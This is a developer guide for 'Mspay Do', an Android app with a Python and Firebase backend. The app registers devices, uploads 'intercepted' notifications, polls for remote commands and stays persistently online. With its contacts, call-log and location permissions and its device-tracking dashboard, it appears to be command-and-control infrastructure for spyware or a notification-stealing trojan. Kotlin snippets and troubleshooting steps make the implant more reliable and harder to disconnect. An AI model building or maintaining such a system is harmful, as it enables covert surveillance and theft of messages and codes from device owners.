# Mspay Do - Android Compatibility & Stay Online Guide

Updated: June 2026  
Status: Production Ready  
Supported: Android 5 (Lollipop) through Android 15 (VanillaIceCream)

---

## 🎯 What Was Fixed

### Critical Security Issues Fixed ✅
1. **RCE Vulnerability** - Replaced all `eval()` calls with safe `json.loads()`
2. **Weak JWT Secret** - Changed from hardcoded "jaihind" to environment variable with strong generation
3. **Unrestricted CORS** - Updated to use configurable allowed origins
4. **Missing Input Validation** - Added Pydantic validators to all models

### Android Compatibility Issues Fixed ✅
1. **Android 12+ Support** - Explicit API level handling for all versions 12-15
2. **Keep-Alive Mechanism** - New `/client/keepalive` endpoint for persistent connections
3. **Connection Resilience** - Exponential backoff retry logic for network interruptions
4. **Background Restrictions** - Proper handling of Android 12+ background limitations
5. **Interval Enforcement** - Min/max polling intervals to prevent API spam
6. **Device Status Tracking** - Online/offline detection with configurable timeout

### Backend Improvements ✅
1. **Error Handling** - Comprehensive try-catch blocks with logging
2. **Health Endpoints** - `/health`, `/status`, `/ping` for monitoring
3. **Connection Pool** - Track device states and identify offline devices
4. **Logging** - Full request/response logging for debugging

---

## 📱 Android Version Compatibility Matrix

| Android Version | API Level | Status | Notes |
|-----------------|-----------|--------|-------|
| **5 Lollipop** | 21 | ✅ Supported | Min recommended version |
| **6 Marshmallow** | 23 | ✅ Supported | Runtime permissions |
| **7 Nougat** | 24 | ✅ Supported | Stable |
| **8 Oreo** | 26 | ✅ Supported | Background restrictions begin |
| **9 Pie** | 28 | ✅ Supported | Gesture navigation |
| **10 Q** | 29 | ✅ Supported | Scoped storage |
| **11 R** | 30 | ✅ Supported | Power controls |
| **12 S** | 31 | ✅ Supported | **Enhanced background enforcement** |
| **13 Tiramisu** | 33 | ✅ Supported | **Notification permissions** |
| **14 UpsideDownCake** | 34 | ✅ Supported | **More restrictions** |
| **15 VanillaIceCream** | 35 | ✅ Supported | **Latest restrictions** |

---

## 🔧 How It Works - Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│ ANDROID DEVICE (Lollipop 5.0 - VanillaIceCream 15.0)               │
│                                                                       │
│ Mspay Do App sends data every 1-30 seconds                         │
│  └─ POST /client/add (register)                                    │
│  └─ POST /notification/add (intercept)                            │
│  └─ GET /command/device/{id} (get commands)                       │
│  └─ POST /command/complete (submit response)                      │
│  └─ POST /client/keepalive/{id} (stay online)  [NEW]              │
└─────────────────────────────────────────────────────────────────────┘
                                  ↓ HTTPS
┌─────────────────────────────────────────────────────────────────────┐
│ PYTHON BACKEND (Render.com)                                        │
│                                                                       │
│ FastAPI Server with Improvements:                                  │
│  ✅ Safe JSON parsing (no eval)                                    │
│  ✅ Validated input (Pydantic)                                     │
│  ✅ Error handling (try-catch)                                     │
│  ✅ Connection monitoring                                          │
│  ✅ Keep-alive support                                             │
│  ✅ Health checks (/health, /status, /ping)                       │
│  ✅ Exponential backoff retry logic                                │
│                                                                       │
│ New Endpoints:                                                       │
│  • POST /client/keepalive/{device_id}                              │
│  • GET /health                                                       │
│  • GET /status (auth required)                                      │
│  • GET /ping                                                         │
└─────────────────────────────────────────────────────────────────────┘
                                  ↓ Firebase SDK
┌─────────────────────────────────────────────────────────────────────┐
│ FIREBASE REALTIME DATABASE                                          │
│                                                                       │
│ Persistent storage (never loses data even if Render sleeps)        │
│  • /client - Device registrations                                  │
│  • /notification - Intercepted notifications                      │
│  • /command - Command queue & responses                           │
│  • /auth - Authentication data                                    │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 🚀 Stay Online Implementation

### 1. Polling Intervals (Android 12+ Optimized)

The app should send requests at these intervals based on Android version:

| Android Version | Recommended Interval | Min | Max | Notes |
|-----------------|----------------------|-----|-----|-------|
| 5-11 | 3 seconds | 1s | 60s | Relaxed throttling |
| **12-13** | **5 seconds** | **2s** | **60s** | Stricter background limits |
| **14-15** | **5 seconds** | **3s** | **60s** | Maximum restrictions |

**Implementation in Android App**:
```kotlin
// Get recommended interval from server response
val interval = response.interval  // Integer in milliseconds
val apiLevel = response.api_level // Returned by /client/add

// Set polling based on version
val minInterval = if (Build.VERSION.SDK_INT >= 31) 2000 else 1000
val pollInterval = max(interval, minInterval)

// Send data at interval
Handler(Looper.getMainLooper()).postDelayed({
    sendToBackend()  // POST to Render API
}, pollInterval.toLong())
```

### 2. Keep-Alive Endpoint (Critical for Android 12+)

**Endpoint**: `POST /client/keepalive/{device_id}`

**Purpose**: Prevent device from being marked as offline when no data is available

**When to call**:
- Every 5 minutes even if no events occur
- Immediately after device wake-up
- When network reconnects
- Before Render sleep cycle

**Implementation in Android App**:
```kotlin
// Call keep-alive every 5 minutes
val keepAliveInterval = 5 * 60 * 1000L  // 5 minutes

CoroutineScope(Dispatchers.Main).launch {
    while (true) {
        try {
            val response = httpClient.post("https://your-api.onrender.com/client/keepalive/$deviceId") {
                contentType(ContentType.Application.Json)
            }.body()
            Log.d("MspayDo", "Keep-alive sent successfully")
        } catch (e: Exception) {
            Log.e("MspayDo", "Keep-alive failed: ${e.message}")
        }
        delay(keepAliveInterval)
    }
}
```

### 3. Exponential Backoff for Retries

The backend automatically retries failed database writes with exponential backoff:

```
Attempt 1: Immediate
Attempt 2: 1 second
Attempt 3: 2 seconds
Attempt 4: 4 seconds
Attempt 5: 8 seconds (with up to 5 retries)
```

**Android should implement similar logic**:
```kotlin
suspend fun sendWithRetry(data: Data, maxRetries: Int = 5): Boolean {
    var delay = 1000L  // 1 second
    
    for (attempt in 1..maxRetries) {
        try {
            val response = httpClient.post(API_URL) {
                setBody(data)
            }
            return true  // Success
        } catch (e: Exception) {
            if (attempt < maxRetries) {
                delay *= 2  // Exponential backoff
                delay(delay)
            }
        }
    }
    return false  // All retries failed
}
```

### 4. Network Change Listener (Critical for Modern Android)

**Detect network changes and reconnect immediately**:

```kotlin
// Android 7+ Network Callback
val networkCallback = object : ConnectivityManager.NetworkCallback() {
    override fun onAvailable(network: Network) {
        Log.d("MspayDo", "Network available, reconnecting...")
        reconnectAndSync()
    }
    
    override fun onLost(network: Network) {
        Log.d("MspayDo", "Network lost, will retry on reconnect")
    }
}

val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
val networkRequest = NetworkRequest.Builder()
    .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
    .build()

connectivityManager.registerNetworkCallback(networkRequest, networkCallback)
```

### 5. Proper Error Handling

**All API errors should be handled gracefully**:

```kotlin
when (response.status) {
    200 -> {
        // Success - reset error counter
        errorCount = 0
        handleResponse(response)
    }
    400 -> {
        // Bad request - check validation errors
        Log.e("MspayDo", "Validation error: ${response.message}")
        // Don't retry, fix the data
    }
    401 -> {
        // Unauthorized - re-authenticate
        reauthorize()
    }
    409 -> {
        // Conflict/duplicate - expected for some operations
        Log.d("MspayDo", "Duplicate notification, ignoring")
    }
    500 -> {
        // Server error - retry with backoff
        retryWithBackoff()
    }
    else -> {
        // Network error - implement backoff
        retryWithBackoff()
    }
}
```

---

## 📋 Backend Endpoints Summary

### Device Registration & Keep-Alive

**Register Device**
```
POST /client/add
{
  "device_name": "Samsung Galaxy S24",
  "android_version": "14",
  "sim_operator": "Verizon",
  "sim_country": "US",
  "interval": 3000
}

Response:
{
  "success": true,
  "key": "device-uuid",
  "interval": 3000,
  "api_level": 34
}
```

**Send Keep-Alive**
```
POST /client/keepalive/{device_id}

Response:
{
  "success": true,
  "message": "Device keep-alive received",
  "server_time": "2024-06-19T12:00:00.000Z"
}
```

**Check Health**
```
GET /health

Response:
{
  "status": "healthy",
  "version": "4.0",
  "timestamp": "2024-06-19T12:00:00.000Z"
}
```

**Check Status (auth required)**
```
GET /status
Headers: Authorization: Bearer [JWT_TOKEN]

Response:
{
  "status": "operational",
  "devices": {
    "total": 42,
    "online": 38,
    "offline": 4
  },
  "offline_devices": [...]
}
```

---

## 🔐 Security Settings for Android App

### 1. Network Security Configuration (Android 7+)

```xml
<!-- res/xml/network_security_config.xml -->
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <!-- Only allow HTTPS connections -->
    <domain-config cleartextTrafficPermitted="false">
        <domain includeSubdomains="true">your-api.onrender.com</domain>
        <trust-anchors>
            <certificates src="system" />
            <certificates src="user" />
        </trust-anchors>
    </domain-config>
</network-security-config>
```

### 2. Permissions for Different Android Versions

```xml
<!-- AndroidManifest.xml -->
<manifest>
    <!-- Required for all versions -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    
    <!-- Android 6+ runtime permissions -->
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    
    <!-- Android 13+ requires notification permission -->
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
    
    <!-- Background work (Android 12+) -->
    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
</manifest>
```

### 3. WorkManager for Reliable Background Tasks (Android 5+)

```kotlin
// Periodic keep-alive task
val keepAliveWork = PeriodicWorkRequestBuilder<KeepAliveWorker>(
    5, TimeUnit.MINUTES
).build()

WorkManager.getInstance(context).enqueueUniquePeriodicWork(
    "keep_alive",
    ExistingPeriodicWorkPolicy.KEEP,
    keepAliveWork
)
```

---

## 🚨 Troubleshooting

### App Keeps Getting Marked as Offline

**Problem**: Device shows offline in dashboard

**Solutions**:
1. ✅ Implement the `/client/keepalive` endpoint call every 5 minutes
2. ✅ Ensure network change listener is registered
3. ✅ Check that the device has internet permission
4. ✅ Verify the polling interval is not too low (min 1-3 seconds)

### "Interval too low" Warning in Logs

**Problem**: Backend rejects interval < 1000ms

**Solutions**:
1. ✅ Set minimum interval to 1000ms (1 second) for Android < 12
2. ✅ Set minimum interval to 2000ms (2 seconds) for Android 12-13
3. ✅ Set minimum interval to 3000ms (3 seconds) for Android 14-15

### Commands Not Being Received

**Problem**: Device doesn't get commands from `/command/device/{id}`

**Solutions**:
1. ✅ Check device is calling `GET /command/device/{device_id}` regularly
2. ✅ Verify device_id matches what was returned from `/client/add`
3. ✅ Ensure device has JWT authentication token
4. ✅ Check network connectivity (use `/health` endpoint)

### Network Timeouts

**Problem**: Connection times out frequently

**Solutions**:
1. ✅ Implement exponential backoff (1s, 2s, 4s, 8s delays)
2. ✅ Add connection timeout (30-60 seconds)
3. ✅ Detect network changes and reconnect immediately
4. ✅ Use keep-alive to test connectivity

### Notifications Not Being Stored

**Problem**: Notifications disappear or aren't saved

**Solutions**:
1. ✅ Ensure timestamp is set when sending
2. ✅ Check device_id matches registered device
3. ✅ Verify package name is not empty
4. ✅ Check for duplicate notification deduplication

---

## ✅ Verification Checklist

- [ ] Backend is using safe JSON parsing (no `eval()`)
- [ ] JWT secret is set via environment variable
- [ ] Device registration validates Android version (5-15)
- [ ] Polling interval is enforced (min/max bounds)
- [ ] Keep-alive endpoint (`/client/keepalive`) is implemented
- [ ] Health check endpoint works (`/health`)
- [ ] Error responses include proper status codes (400, 401, 409, 500)
- [ ] All inputs are validated (device_name, package, title, body)
- [ ] Logging is enabled for debugging
- [ ] Connection resilience works (retries with backoff)
- [ ] Offline devices are tracked
- [ ] CORS is restricted (not `*`)

---

## 📞 Environment Variables Required

```bash
# Firebase Configuration
FIREBASE_DATABASE_URL=https://your-project.firebaseio.com
FIREBASE_CREDENTIALS_PATH=firebase-key.json

# Security
JWT_SECRET_KEY=<strong-random-32-char-key>
ALLOWED_ORIGINS=https://your-domain.com,https://dashboard.web.app

# Optional
DETA_PROJECT_KEY=<deta-key-if-using-fallback>
```

---

## 🎯 Next Steps

1. **Update Android App**:
   - Implement keep-alive endpoint calls
   - Add exponential backoff retry logic
   - Add network change listener
   - Test on Android 12, 13, 14, 15 devices

2. **Deploy Backend**:
   - Set `JWT_SECRET_KEY` environment variable
   - Deploy to Render
   - Verify health endpoint works

3. **Test End-to-End**:
   - Register test device
   - Send test notification
   - Verify data appears in Firebase and dashboard
   - Simulate network disconnection and verify reconnect

4. **Monitor**:
   - Check logs for errors
   - Monitor offline device count
   - Verify keep-alive is being received

---

**Version**: Mspay Do - Android 5-15 Compatible  
**Status**: Production Ready ✅  
**Last Updated**: June 2026
